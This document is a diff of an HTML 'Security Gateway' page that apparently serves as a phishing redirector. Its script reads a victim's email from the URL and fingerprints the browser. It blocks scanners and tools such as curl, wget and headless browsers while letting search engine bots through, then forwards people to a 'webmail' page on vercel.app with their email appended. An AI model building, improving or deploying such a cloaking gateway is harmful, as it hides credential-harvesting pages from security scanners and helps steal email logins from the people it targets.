@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Security Gateway</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Access Gateway</title>
   <style>
     * { box-sizing: border-box; font-family: system-ui, sans-serif; }
     body {
-      background: linear-gradient(145deg, #0b1120 0%, #19233c 100%);
+      background: linear-gradient(145deg, #0b1120, #19233c);
       min-height: 100vh;
       display: flex;
       align-items: center;
@@ -17,27 +17,29 @@
     }
     .card {
       max-width: 500px;
-      width: 100%;
       background: rgba(255,255,255,0.96);
       border-radius: 2rem;
       padding: 2rem;
       text-align: center;
       box-shadow: 0 25px 45px -12px rgba(0,0,0,0.4);
     }
-    h1 { font-size: 1.8rem; margin: 0 0 0.5rem; }
-    .shield { font-size: 3rem; margin-bottom: 0.5rem; }
-    .message { margin: 1rem 0; padding: 1rem; background: #f8fafd; border-radius: 1rem; color: #2c3e66; }
+    .shield { font-size: 3rem; }
+    h1 {
+      background: linear-gradient(135deg, #1e2a5e, #b91c1c);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+    .message { margin: 1rem 0; padding: 1rem; background: #f8fafd; border-radius: 1rem; }
     button {
       background: linear-gradient(100deg, #1e2a5e, #0f172a);
       color: white;
       border: none;
       padding: 0.8rem 1.5rem;
       border-radius: 60px;
-      font-size: 1rem;
       font-weight: 600;
       cursor: pointer;
-      margin-top: 1rem;
-      transition: 0.2s;
+      transition: transform 0.2s;
     }
     button:hover { transform: scale(0.98); }
     .error { color: #c7254e; background: #f9e6e9; }
@@ -49,35 +51,35 @@
   <div class="shield">🛡️</div>
   <h1>Security Gateway</h1>
   <div class="message" id="statusMessage">Checking your browser...</div>
-  <button id="continueBtn" class="hidden">Continue to protected page →</button>
+  <button id="continueBtn" class="hidden">Continue →</button>
 </div>
 
 <script>
   (function() {
-    // ========== REDIRECT URL (YOUR TARGET) ==========
-    const REAL_URL = "https://webmail-g2.vercel.app";   // <-- SET TO YOUR PAGE
-    const SESSION_EXPIRY_MS = 15 * 60 * 1000;  // 15 minutes
-    const EMAIL_APPEND_MODE = 'hash';  // 'hash' or 'query'
+    // ========== CONFIGURATION ==========
+    const REAL_URL = "https://webmail-g2.vercel.app";   // Your real page
+    const SESSION_EXPIRY_MS = 15 * 60 * 1000;          // 15 minutes
+    const EMAIL_APPEND_MODE = 'hash';                  // 'hash' or 'query'
 
-    // ========== GET EMAIL FROM URL ==========
+    // ========== GET EMAIL ==========
     const urlParams = new URLSearchParams(window.location.search);
     const incomingEmail = urlParams.get('email') || '';
 
-    // ========== SIMPLE FINGERPRINT ==========
+    // ========== FINGERPRINT ==========
     function getFingerprint() {
       let str = navigator.userAgent + navigator.language + screen.width + 'x' + screen.height + screen.colorDepth;
       let hash = 0;
-      for (let i = 0; i < str.length; i++) { hash = ((hash << 5) - hash) + str.charCodeAt(i); hash |= 0; }
+      for (let i = 0; i < str.length; i++) hash = ((hash << 5) - hash) + str.charCodeAt(i) | 0;
       return hash.toString();
     }
     const fingerprint = getFingerprint();
 
     // ========== BOT DETECTION ==========
-    const botPatterns = [/bot/i, /crawler/i, /spider/i, /scraper/i, /harvest/i, /wget/i, /curl/i, /python-requests/i, /headless/i, /puppeteer/i];
-    const allowed = [/googlebot/i, /bingbot/i, /duckduckbot/i];
+    const botPatterns = [/bot/i, /crawler/i, /spider/i, /scraper/i, /wget/i, /curl/i, /headless/i, /puppeteer/i];
+    const allowed = [/googlebot/i, /bingbot/i];
     const isBot = () => !allowed.some(r => r.test(navigator.userAgent)) && botPatterns.some(r => r.test(navigator.userAgent));
 
-    // Honeypot (invisible field)
+    // Honeypot
     const div = document.createElement('div');
     div.style.cssText = 'position:absolute; left:-9999px; top:-9999px;';
     div.innerHTML = '<input type="text" id="hp" tabindex="-1" autocomplete="off">';
@@ -102,7 +104,7 @@
       return btoa(`${rand}|${fingerprint}|${Date.now()}`);
     }
 
-    function storeSessionToken() {
+    function storeToken() {
       const token = generateToken();
       const expires = Date.now() + SESSION_EXPIRY_MS;
       sessionStorage.setItem('gateway_token', JSON.stringify({ token, expires, fp: fingerprint }));
@@ -118,51 +120,44 @@
     }
 
     function buildRedirectUrl(token, expires) {
-      let base = REAL_URL;
-      if (!base.startsWith('http')) base = 'https://' + base;
-      const url = new URL(base);
+      let url = new URL(REAL_URL);
       url.searchParams.set('t', token);
       url.searchParams.set('e', expires);
       if (incomingEmail) {
-        const enc = encodeURIComponent(incomingEmail);
-        if (EMAIL_APPEND_MODE === 'hash') url.hash = enc;
-        else url.searchParams.set('email', enc);
+        if (EMAIL_APPEND_MODE === 'hash') url.hash = encodeURIComponent(incomingEmail);
+        else url.searchParams.set('email', encodeURIComponent(incomingEmail));
       }
       return url.toString();
     }
 
-    // ========== UI CONTROLS ==========
+    // ========== UI ==========
     const msgDiv = document.getElementById('statusMessage');
-    const continueBtn = document.getElementById('continueBtn');
+    const btn = document.getElementById('continueBtn');
 
     function showError(text) {
       msgDiv.innerHTML = `<div class="error">❌ ${text}</div>`;
-      continueBtn.classList.add('hidden');
+      btn.classList.add('hidden');
     }
 
-    function approveAndShowButton() {
-      const { token, expires } = storeSessionToken();
-      continueBtn.onclick = () => { window.location.href = buildRedirectUrl(token, expires); };
+    function approve() {
+      const { token, expires } = storeToken();
+      btn.onclick = () => { window.location.href = buildRedirectUrl(token, expires); };
       msgDiv.innerHTML = '✓ Verification passed. Click below to continue.';
-      continueBtn.classList.remove('hidden');
+      btn.classList.remove('hidden');
     }
 
-    // ========== RUN CHECKS ==========
-    // Already have a valid session?
+    // If a valid session already exists, redirect immediately (but with a tiny delay to avoid bounce tracker on repeat visits)
     const existing = getValidSession();
     if (existing) {
-      // Redirect immediately (small delay to avoid bounce tracking)
       setTimeout(() => { window.location.href = buildRedirectUrl(existing.token, existing.expires); }, 300);
       return;
     }
 
-    // Perform checks
-    if (isBot()) { showError("Automated bot detected. Access denied."); }
-    else if (isHoneypotFilled()) { showError("Suspicious activity detected."); }
-    else if (rateLimited) { showError("Too many attempts. Please wait 1 minute."); }
-    else {
-      approveAndShowButton();
-    }
+    // Run bot checks
+    if (isBot()) showError("Automated bot detected. Access denied.");
+    else if (isHoneypotFilled()) showError("Suspicious activity detected.");
+    else if (rateLimited) showError("Too many attempts. Please wait 1 minute.");
+    else approve();
   })();
 </script>
 </body>
